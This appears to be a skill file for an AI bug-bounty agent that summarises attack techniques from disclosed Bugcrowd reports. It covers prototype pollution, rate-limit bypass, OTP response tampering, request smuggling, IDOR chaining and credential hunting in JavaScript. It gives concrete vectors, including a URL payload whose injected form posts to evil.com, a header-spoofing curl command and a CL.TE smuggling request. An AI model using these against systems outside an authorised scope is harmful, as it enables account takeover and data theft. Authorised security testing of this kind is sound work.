---
name: crowdstream-techniques
description: Attack techniques learned from Bugcrowd CrowdStream disclosed reports and external writeups. Covers prototype pollution, rate limit bypass, OTP bypass, HTTP desync, IDOR chaining, and credential discovery.
---

# CrowdStream Techniques

**When to load this skill**: When beginning work on a new program, or before narrowing into a specific target. Load this first to survey community techniques — broader learning before deep probing. Also load when analyzing a specific vulnerability class (e.g. IDOR, rate limiting, prototype pollution) to cross-reference with existing disclosed approaches.

**How to use CrowdStream**: Browse https://bugcrowd.com/crowdstream?page=N with `accepted=1&disclosed=1` filters. Focus on programs with disclosed writeups containing detailed PoCs. Read the summaries, then replicate the technique in your target's context. Also search external writeups (Medium, blogs) for programs not fully disclosed on CrowdStream.

# CrowdStream Techniques

Attack patterns learned from studying ~15 disclosed Bugcrowd reports and external bug bounty writeups.

## 1. Prototype Pollution → HTML Injection / XSS

**Source**: Tesla ($200, P4) via BlackFan (2020)
**Technique**: `backbone.queryparams.js` process URL params and merges them into objects. By passing `?__proto__.id=1&__proto__.display_name=<iframe srcdoc='...'>`, attacker injects into `Object.prototype`. When the template engine renders `display_name`, it uses the polluted prototype value directly in the DOM.

**Scripts commonly vulnerable**: backbone.queryparams.js, jQuery $.extend(true, ...), Angular merge, lodash.defaultsDeep

**Detection**:
- Search JS source for libraries that recursively merge URL params
- Test: `?__proto__[test]=injected` and check `Object.prototype.test`
- If no XSS due to CSP, use iframe injection for phishing (CSP usually allows iframes from same origin)

**Example URL vector**:
```
https://target.com/?__proto__.id=1&__proto__.display_name=<iframe/srcdoc='<form action=//evil.com method=POST>...'></iframe>
```

## 2. Rate Limit Bypass via X-Forwarded-For

**Source**: YNAB ($150, P4) via ShahwarShah (2024)
**Technique**: Registration/login rate limiting uses `X-Forwarded-For` or `X-Real-IP` header to track rate per IP. Manipulating the header with a different IP each request bypasses the limit.

**Test**: 
```
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/register
```
Try `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `CF-Connecting-IP`, `True-Client-IP`

## 3. OTP / 2FA Bypass via Response Modification

**Source**: Indeed ($250, P3) via svla01 (2024); Crypto Exchange (Steemit writeup)
**Technique**: Intercept the HTTP response from the OTP verification endpoint. The server returns JSON like `{"success": false, "token": null}`. Modifying the response to `{"success": true, "token": "valid"}` bypasses the check entirely.

**Variants**:
- `true` / `false` values in JSON
- HTTP status codes (200 vs 403)
- Presence/absence of tokens in response

**Steps**:
1. Submit any OTP (e.g., `123456`)
2. Intercept response in Burp proxy
3. Change `"success": false` → `"success": true`
4. Forward the modified response
5. If the client-side does the actual validation server-side, try modifying the RESPONSE the server returns, not the request

## 4. HTTP Desync / Request Smuggling → Mass Session Hijacking

**Source**: Foxy.io ($500, P1) via AnkitSingh (2022)
**Technique**: Frontend server uses `Content-Length` while backend uses `Transfer-Encoding: chunked` (CL/TE discrepancy). Attacker sends a crafted request that the frontend sees as one request but the backend splits into two — the "prefix" gets prepended to the next user's request.

**Detection**:
```
# CL.TE test
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If timeout or 200 vs 400 difference → desync possible.

**Escalation**: If the target reflects a POST parameter in an HTML page (shopping cart, profile, etc.), the smuggled prefix can include a form POST that steals the next user's session.

**Tools**: Turbo Intruder, Burp Suite HTTP Request Smuggler extension

## 5. IDOR + 2FA Bypass Chain → Full Account Takeover

**Source**: Crypto Exchange (Steemit writeup by mabdullah22), Real-World BH Ch16 (3 case studies)
**CRITICAL**: IDOR requires crossing a **resource ownership boundary** (different user/workspace/tenant). Sequential IDs alone do NOT create IDOR — the missing authorization check does. Always test with TWO accounts in different scopes before claiming IDOR. Enumerating within your own scope is not a vulnerability regardless of ID format.

**Technique**: Two simple bugs chained together:
1. **Password Reset IDOR**: `/api/reset_password` has an incrementing `userId` parameter. Change it to another user's ID → resets their password.
2. **2FA Response Manipulation**: After password reset, the 2FA verification endpoint returns `{"valid": false}`. Change to `{"valid": true}` → bypass 2FA.

Found admin email/ID via IDOR in the ticket system but didn't exploit.

**Takeaway**: Chaining low-severity bugs creates high-severity impact. Password reset IDOR alone = P3, but with 2FA bypass = P1 ATO.

## 6. Hardcoded Credentials in JS Source Files

**Source**: EPA / Lucidworks (P4, 2024) via IthacaLabs
**Technique**: Credentials `publicuser:publicuser1` found in cleartext in `search.epa.gov/epasearch/app_v2_1.js`. Search JS bundles for hardcoded credentials, API keys, or default passwords.

**Method**:
- Download all JS bundles (e.g., with `wget` or browser devtools)
- Search with regex: `"password":\s*"[^"]+"`, `"username":\s*"[^"]+"`, `"user":\s*"[^"]+",.*"pass"`
- Check source maps for original source
- After login with found creds, look for prototype pollution or other client-side bugs to escalate

## 7. Open Redirect → Mass Information Disclosure

**Source**: Bugcrowd disclosed report
**Technique**: OAuth flow has `redirect_uri` parameter that redirects to attacker-controlled domain. Since the OAuth page collects sensitive identity info (SSN, Govt IDs), the attacker redirects victims to their site where the leaked data ends up in server logs.

**Test**: In OAuth flows, test `redirect_uri` parameter for open redirect. If it redirects to any domain, try redirecting to your own server and check if sensitive data follows in the URL.

## Key Lessons

1. **Intercept RESPONSES, not just requests** — OTP bypass, 2FA bypass, and many auth check bypasses happen in response modification
2. **Chain simple bugs** — IDOR + response manipulation = ATO. Rate limit bypass + enumeration = data leak. Low + low = high
3. **Check JS bundles for creds** — API keys, passwords, secrets often end up in client-side JS
4. **Test URL parsers** — `__proto__`, `constructor`, `__defineGetter__` for prototype pollution
5. **HTTP parsing ambiguity** — CL/TE, TE/CL, duplicate headers — always test for desync
